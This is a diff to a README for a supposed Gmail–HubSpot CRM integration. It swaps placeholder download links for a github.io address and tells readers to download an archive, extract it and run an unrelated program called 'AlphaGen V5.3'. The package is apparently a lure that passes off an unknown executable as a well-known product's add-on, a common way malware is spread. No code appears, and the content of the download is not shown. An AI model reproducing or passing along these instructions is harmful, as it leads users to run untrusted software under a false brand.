@@ -2,13 +2,13 @@
 
 Connect Gmail with HubSpot CRM to log emails, track replies, and automate contact creation — all without leaving your inbox.
 
-[![Download](https://img.shields.io/badge/Download-Gmail_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Gmail_HubSpot_Integration-blueviolet)](https://gmail-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://gmail-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract to a convenient location  
 3. 🖱 Run AlphaGen V5.3 to initialize the integration module  
 4. ✅ Log into Gmail and authorize the HubSpot CRM Chrome Extension or Gmail Add-on
